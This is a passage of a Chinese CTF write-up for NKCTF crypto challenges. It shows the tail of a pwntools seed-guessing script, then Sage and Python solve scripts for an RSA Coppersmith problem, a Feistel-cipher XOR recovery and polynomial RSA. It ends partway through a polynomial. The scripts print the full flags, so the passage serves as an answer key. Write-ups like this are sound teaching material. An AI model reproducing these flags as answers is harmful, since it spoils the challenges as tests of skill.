class="hljs-built_in">int</span>(Line[<span class="hljs-number">14</span>:])<br>        io.recvuntil(<span class="hljs-string">&#x27;Guess seed number:&#x27;</span>)<br>        io.sendline(<span class="hljs-built_in">str</span>(guess_3(last_number)))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;extract number = &#x27;</span> <span class="hljs-keyword">in</span> Line:<br>        ex_number = <span class="hljs-built_in">int</span>(Line[<span class="hljs-number">17</span>:])<br>        io.recvuntil(<span class="hljs-string">&#x27;Guess be extracted number:&#x27;</span>)<br>        io.sendline(<span class="hljs-built_in">str</span>(guess_4(ex_number)))<br>io.recvall()<br></code></pre></td></tr></table></figure><h2 id="easyrsa">easyrsa</h2><p>考点：</p><ol><li>数论推导</li><li>coppersmith攻击</li></ol><p>第一问：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>∗</mo><mi>q</mi><mo>∗</mo><mi>s</mi><mo>∗</mo><mi>t</mi></mrow><annotation encoding="application/x-tex">n=p*q*s*t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6597em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4653em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6151em;"></span><span class="mord mathnormal">t</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mi>h</mi><mi>i</mi><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>s</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mo stretchy="false">(</mo><mi>t</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">phi=(p-1)*(q-1)*(s-1)*(t-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">hi</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span></p><p>首先可以求出<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>=</mo><msup><mi>e</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mi>h</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">d=e^{-1}\mod{phi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">hi</span></span></span></span>，而<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>∗</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">c=m^e\mod{p*q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p><p>由欧拉定理有：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>c</mi><mi>d</mi></msup><mo>=</mo><mi>m</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>∗</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">c^d=m\mod{p*q}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></p><p>即：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>c</mi><mi>d</mi></msup><mo>−</mo><mi>x</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mo>∗</mo><mi>q</mi><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">f(x)=c^d-x\mod{p*q}\mod{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9324em;vertical-align:-0.0833em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span></span></span></span>较小。</p><p>利用coppersmith攻击求出x。</p><p>第二问同babyrsa。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">8836130216343708623415307573630337110573363595188748983290313549413242332143945452914800845282478216810685733227137911630239808895196748125078747600505626165666334675100147790578546682128517668100858766784733351894480181877144793496927464058323582165412552970999921215333509253052644024478417393146000490808639363681195799826541558906527985336104761974023394438549055804234997654701266967731137282297623426318212701157416397999108259257077847307874122736921265599854976855949680133804464839768470200425669609996841568545945133611190979810786943246285103031363790663362165522662820344917056587244701635831061853354597</span><br>phi = <span class="hljs-number">8836130216343708623415307573630337110573363595188748983290313549413242332143945452914800845282478216810685733227137911630239808895196748125078747600505622503351461565956106005118029537938273153581675065762015952483687057805462728186901563990429998916382820576211887477098611684072561849314986341226981300596338314989867731725668312057134075244816223120038573374383949718714549930261073576391501671722900294331289082826058292599838631513746370889828026039555245672195833927609280773258978856664434349221972568651378808050580665443131001632395175205804045958846124475183825589672204752895252723130454951830966138888560</span><br>c1 = <span class="hljs-number">78327207863361017953496121356221173288422862370301396867341957979087627011991738176024643637029313969241151622985226595093079857523487726626882109114134910056673489916408854152274726721451884257677533593174371742411008169082367666168983943358876017521749198218529804830864940274185360506199116451280975188409</span><br>e = <span class="hljs-number">65537</span><br><span class="hljs-comment">#c1 = m^e mod p*q</span><br><span class="hljs-comment">#m1 = c1^d mod p*q*r*t</span><br><span class="hljs-comment">#m1 = m mod p*q √</span><br>d = invert(e, phi)<br>c = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c1, d, n))<br>PR.&lt; x &gt; = PolynomialRing(Zmod(n))<br>f = c - x <span class="hljs-comment">#c-x=k*p*q</span><br>f = f.monic()<br>x0 = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">300</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.015</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(x0)<br><span class="hljs-comment">#NKCTF&#123;it_i5_e45y_th4t_Kn0wn</span><br><br>N = <span class="hljs-number">157202814866563156513184271957553223260772141845129283711146204376449001653397810781717934720804041916333174673656579086498762693983380365527400604554663873045166444369504886603233275868192688995284322277504050322927511160583280269073338415758019142878016084536129741435221345599028001581385308324407324725353</span><br>c2 = <span class="hljs-number">63355788175487221030596314921407476078592001060627033831694843409637965350474955727383434406640075122932939559532216639739294413008164038257338675094324172634789610307227365830016457714456293397466445820352804725466971828172010276387616894829328491068298742711984800900411277550023220538443014162710037992032</span><br>c3 = <span class="hljs-number">9266334096866207047544089419994475379619964393206968260875878305040712629590906330073542575719856965053269812924808810766674072615270535207284077081944428011398767330973702305174973148018082513467080087706443512285098600431136743009829009567065760786940706627087366702015319792328141978938111501345426931078</span><br><br>PR.&lt; x &gt; = PolynomialRing(Zmod(N))<br>f = x^<span class="hljs-number">2</span>-(c2+c3)*x+c2*c3<br>f = f.monic()<br>x0 = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">440</span>,beta=<span class="hljs-number">0.4</span>,epsilon=<span class="hljs-number">0.015</span>)[<span class="hljs-number">0</span>]<br><span class="hljs-built_in">print</span>(x0)<br><span class="hljs-comment">#_phi_4nd_N_dec0mp0ses_N_w1th_th3_s4m3_c0mm0n_n_but_pq&#125;</span><br></code></pre></td></tr></table></figure><h2 id="eZ-Bl⊕ck">eZ_Bl⊕ck</h2><p>考点</p><ol><li>Feistel结构</li><li>异或</li></ol><p>可以参考：<a href="http://striving.mapleice.top/index.php/archives/150/%E7%AC%AC%E4%B8%89%E9%A2%98%E5%AD%A6%E4%B9%A0">http://striving.mapleice.top/index.php/archives/150/第三题学习</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> *<br><br>r=<span class="hljs-string">b&quot;t\xf7\xaa\xac\x9d\x88\xa4\x8b\x1f+pA\x84\xacHg&#x27;\x07&#123;\xcc\x06\xc4i\xdd)\xda\xc9\xad\xa9\xe8\x1fi&quot;</span><br>c1=<span class="hljs-string">b&quot;&#x27;&#123;&lt;z&#125;\x91\xda\xc5\xd5S\x8b\xfa\x9f~]J\x0f\xf4\x9a\x1e\xe0\xef\x129N\xe7a\x928+\xe0\xee&quot;</span><br>c2=<span class="hljs-string">b&#x27;8\x1f&quot;\x83B4\x86)\xce\xebq3\x06\xa0w\x16U\x04M/w\xa1\x8f;)M\xdd~\x11:\xe3\xb3&#x27;</span><br><br>kn1=strxor(r[<span class="hljs-number">16</span>:],c1[:<span class="hljs-number">16</span>])<br><br>l1=strxor(kn1,c2[:<span class="hljs-number">16</span>])<br><span class="hljs-built_in">print</span>(l1)<br><br>kn2=strxor(strxor(r[<span class="hljs-number">16</span>:],r[:<span class="hljs-number">16</span>]),c1[<span class="hljs-number">16</span>:])<br>r1=strxor(strxor(kn2,c2[<span class="hljs-number">16</span>:]),l1)<br><span class="hljs-built_in">print</span>(r1)<br><br><span class="hljs-comment">#NKCTF&#123;1ccd5cee-c96d-4caf-8ce5-9a512b3d0655&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ez-polynomial">ez_polynomial</h2><p>考点：</p><ol><li>典型的多项式rsa</li></ol><p>可以参考:<a href="https://blog.csdn.net/m0_57291352/article/details/124850426%E5%AD%A6%E4%B9%A0">https://blog.csdn.net/m0_57291352/article/details/124850426学习</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">p=<span class="hljs-number">40031</span><br>R.&lt;y&gt; = PolynomialRing(GF(p))<br>N=<span class="hljs-number">24096</span>*y^<span class="hljs-number">93</span> + <span class="hljs-number">38785</span>*y^<span class="hljs-number">92</span> + <span class="hljs-number">17489</span>*y^<span class="hljs-number">91</span> + <span class="hljs-number">9067</span>*y^<span class="hljs-number">90</span> + <span class="hljs-number">1034</span>*y^<span class="hljs-number">89</span> + <span class="hljs-number">6534</span>*y^<span class="hljs-number">88</span> + <span class="hljs-number">35818</span>*y^<span class="hljs-number">87</span> + <span class="hljs-number">22046</span>*y^<span class="hljs-number">86</span> + <span class="hljs-number">12887</span>*y^<span class="hljs-number">85</span> + <span class="hljs-number">445</span>*y^<span class="hljs-number">84</span> + <span class="hljs-number">26322</span>*y^<span class="hljs-number">83</span> + <span class="hljs-number">37045</span>*y^<span class="hljs-number">82</span> + <span class="hljs-number">4486</span>*y^<span class="hljs-number">81</span> + <span class="hljs-number">3503</span>*y^<span class="hljs-number">80</span> + <span class="hljs-number">1184</span>*y^<span class="hljs-number">79</span> + <span class="hljs-number">38471</span>*y^<span class="hljs-number">78</span> + <span class="hljs-number">8012</span>*y^<span class="hljs-number">77</span> + <span class="hljs-number">36561</span>*y^<span class="hljs-number">76</span> + <span class="hljs-number">19429</span>*y^<span class="hljs-number">75</span> + <span class="hljs-number">35227</span>*y^<span class="hljs-number">74</span> + <span class="hljs-number">10813</span>*y^<span class="hljs-number">73</span> + <span class="hljs-number">26341</span>*y^<span class="hljs-number">72</span> + <span class="hljs-number">29474</span>*y^<span class="hljs-number">71</span> + <span class="hljs-number">2059</span>*y^<span class="hljs-number">70</span> + <span class="hljs-number">16068</span>*y^<span class="hljs-number">69</span> + <span class="hljs-number">31597</span>*y^<span class="hljs-number">68</span> + <span class="hljs-number">14685</span>*y^<span class="hljs-number">67</span> + <span class="hljs-number">9266</span>*y^<span class="hljs-number">66</span> + <span class="hljs-number">31019</span>*y^<span class="hljs-number">65</span> + <span class="hljs-number">6171</span>*y^<span class="hljs-number">64</span> + <span class="hljs-number">385</span>*y^<span class="hljs-number">63</span> + <span class="hljs-number">28986</span>*y^<span class="hljs-number">62</span> + <span class="hljs-number">9912</span>*y^<span class="hljs-number">61</span> + <span class="hljs-number">10632</span>*y^<span class="hljs-number">60</span> + <span class="hljs-number">33741</span>*y^<span class="hljs-number">59</span> + <span class="hljs-number">12634</span>*y^<span class="hljs-number">58</span> + <span class="hljs-number">21179</span>*y^<span class="hljs-number">57</span> + <span class="hljs-number">35548</span>*y^<span class="hljs-number">56</span> + <span class="hljs-number">17894</span>*y^<span class="hljs-number">55</span> + <span class="hljs-number">7152</span>*y^<span class="hljs-number">54</span> + <span class="hljs-number">9440</span>*y^<span class="hljs-number">53</span> + <span class="hljs-number">4004</span>*y^<span class="hljs-number">52</span> + <span class="hljs-number">2600</span>*y^<span class="hljs-number">51</span> + <span class="hljs-number">12281</span>*y^<span class="hljs-number">50</span> + <span class="hljs-number">22</span>*y^<span class="hljs-number">49</span> + <span class="hljs-number">17314</span>*y^<span class="hljs-number">48</span> + <span class="hljs-number">32694</span>*y^<span class="hljs-number">47</span> + <span class="hljs-number">7693</span>*y^<span class="hljs-number">46</span> + <span class="hljs-number">6567</span>*y^<span class="hljs-number">45</span> + <span class="hljs-number">19897</span>*y^<span class="hljs-number">44</span> + <span class="hljs-number">27329</span>*y^<span class="hljs-number">43</span> + <span class="hljs-number">8799</span>*y^<span class="hljs-number">42</span> + <span class="hljs-number">36348</span>*y^<span class="hljs-number">41</span> + <span class="hljs-number">33963</span>*y^<span class="hljs-number">40</span> + <span class="hljs-number">23730</span>*y^<span class="hljs-number">39</span> + <span class="hljs-number">27685</span>*y^<span class="hljs-number">38</span> + <span class="hljs-number">29037</span>*y^<span class="hljs-number">37</span> + <span class="hljs-number">14622</span>*y^<span class="hljs-number">36</span> + <span class="hljs-number">29608</span>*y^<span class="hljs-number">35</span> + <span class="hljs-number">39588</span>*y^<span class="hljs-number">34</span> + <span class="hljs-number">23294</span>*y^<span class="hljs-number">33</span> + <span class="hljs-number">757</span>*y^<span class="hljs-number">32</span> + <span class="hljs-number">20140</span>*y^<span class="hljs-number">31</span> + <span class="hljs-number">19511</span>*y^<span class="hljs-number">30</span> + <span class="hljs-number">1469</span>*y^<span class="hljs-number">29</span> + <span class="hljs-number">3898</span>*y^<span class="hljs-number">28</span> + <span class="hljs-number">6630</span>*y^<span class="hljs-number">27</span> + <span class="hljs-number">19610</span>*y^<span class="hljs-number">26</span> + <span class="hljs-number">11631</span>*y^<span class="hljs-number">25</span> + <span class="hljs-number">7188</span>*y^<span class="hljs-number">24</span> + <span class="hljs-number">11683</span>*y^<span class="hljs-number">23</span> + <span class="hljs-number">35611</span>*y^<span class="hljs-number">22</span> + <span class="hljs-number">37286</span>*y^<span class="hljs-number">21</span> + <span class="hljs-number">32139</span>*y^<span class="hljs-number">20</span> + <span class="hljs-number">20296</span>*y^<span class="hljs-number">19</span> + <span class="hljs-number">36426</span>*y^<span class="hljs-number">18</span> + <span class="hljs-number">25340</span>*y^<span class="hljs-number">17</span> + <span class="hljs-number">36204</span>*y^<span class="hljs-number">16</span> + <span class="hljs-number">37787</span>*y^<span class="hljs-number">15</span> + <span class="hljs-number">31256</span>*y^<span class="hljs-number">14</span> + <span class="hljs-number">505</span>*y^<span class="hljs-number">13</span> + <span class="hljs-number">27508</span>*y^<span class="hljs-number">12</span> + <span class="hljs-number">20885</span>*y^<span class="hljs-number">11</span> + <span class="hljs-number">32037</span>*y^<span class="hljs-number">10</span> + <span class="hljs-number">31236</span>*y^<span class="hljs-number">9</span> + <span class="hljs-number">7929</span>*y^<span class="hljs-number">8</span> + <span class="hljs-number">27195</span>*y^<span class="hljs-number">7</span> + <span class="hljs-number">28980</span>*y^<span class="hljs-number">6</span> + <span class="hljs-number">11863</span>*y^<span class="hljs-number">5</span> + <span class="hljs-number">16025</span>*y^<span class="hljs-number">4</span> + <span class="hljs-number">16389</span>*y^<span class="hljs-number">3</span> + <span class="hljs-number">570</span>*y^<span class="hljs-number">2</span> + <span class="hljs-number">36547</span>*y + <span class="hljs-number">10451</span><br>e = <span class="hljs-number">65537</span><br>q1,q2=N.factor()<br>q1,q2=q1[<span class="hljs-number">0</span>],q2[<span class="hljs-number">0</span>]<br>phi = (p**q1.degree() - <span class="hljs-number">1</span>) * (p**q2.degree() - <span class="hljs-number">1</span>)<br><span class="hljs-keyword">assert</span> gcd(e, phi) == <span class="hljs-number">1</span><br>d = inverse_mod(e, phi)<br>S.&lt;x&gt; = R.quotient(N)<br>C=<span class="hljs-number">3552</span>*x^<span class="hljs-number">92</span> + <span class="hljs-number">6082</span>*x^<span class="hljs-number">91</span> + <span class="hljs-number">25295</span>*x^<span class="hljs-number">90</span> + <span class="hljs-number">35988</span>*x^<span class="hljs-number">89</span> + <span class="hljs-number">26052</span>*x^<span class="hljs-number">88</span> + <span class="hljs-number">16987</span>*x^<span class="hljs-number">87</span> + <span class="hljs-number">12854</span>*x^<span class="hljs-number">86</span> + <span class="hljs-number">25117</span>*x^<span class="hljs-number">85</span> + <span class="hljs-number">25800</span>*x^<span class="hljs-number">84</span> + <span class="hljs-number">30297</span>*x^<span class="hljs-number">83</span> + <span class="hljs-number">5589</span>*x^<span class="hljs-number">82</span> + <span class="hljs-number">23233</span>*x^<span class="hljs-number">81</span> + <span class="hljs-number">14449</span>*x^<span class="hljs-number">80</span> + <span class="hljs-number">4712</span>*x^<span class="hljs-number">79</span> + <span class="hljs-number">35719</span>*x^<span class="hljs-number">78</span> + <span class="hljs-number">1696</span>*x^<span class="hljs-number">77</span> + <span class="hljs-number">35653</span>*x^<span class="hljs-number">76</span> + <span class="hljs-number">13995</span>*x^<span class="hljs-number">75</span> + <span class="hljs-number">13715</span>*x^<span class="hljs-number">74</span> + <span class="hljs-number">4578</span>*x^<span class="hljs-number">73</span> + <span class="hljs-number">37366</span>*x^<span class="hljs-number">72</span> + <span class="hljs-number">25260</span>*x^<span class="hljs-number">71</span> + <span class="hljs-number">28865</span>*x^<span class="hljs-number">70</span> + <span class="hljs-number">36120</span>*x^<span class="hljs-number">69</span> + <span class="hljs-number">7047</span>*x^<span class="hljs-number">68</span> + <span class="hljs-number">10497</span>*x^<span class="hljs-number">67</span> + <span class="hljs-number">19160</span>*x^<span class="hljs-number">66</span> + <span class="hljs-number">17939</span>*x^<span class="hljs-number">65</span> + <span class="hljs-number">14850</span>*x^<span class="hljs-number">64</span> + <span class="hljs-number">6705</span>*x^<span class="hljs-number">63</span> + <span class="hljs-number">17805</span>*x^<span class="hljs-number">62</span> + <span class="hljs-number">30083</span>*x^<span class="hljs-number">61</span> + <span class="hljs-number">2400</span>*x^<span class="hljs-number">60</span> + <span class="hljs-number">10685</span>*x^<span class="hljs-number">59</span> + <span class="hljs-number">15272</span>*x^<span class="hljs-number">58</span> + <span class="hljs-number">2225</span>*x^<span class="hljs-number">57</span> + <span class="hljs-number">13194</span>*x^<span class="hljs-number">56</span> + <span class="hljs-number">14251</span>*x^<span class="hljs-number">55</span> + <span class="hljs-number">31016</span>*x^<span class="hljs-number">54</span> + <span class="hljs-number">10189</span>*x^<span class="hljs-number">53</span> + <span class="hljs-number">35040</span>*x^<span class="hljs-number">52</span> + <span class="hljs-number">7042</span>*x^<span class="hljs-number">51</span> + <span class="hljs-number">29206</span>*x^<span class="hljs-number">50</span> + <span class="hljs-number">39363</span>*x^<span class="hljs-number">49</span> + <span class="hljs-number">32608</span>*x^<span class="hljs-number">48</span> + <span 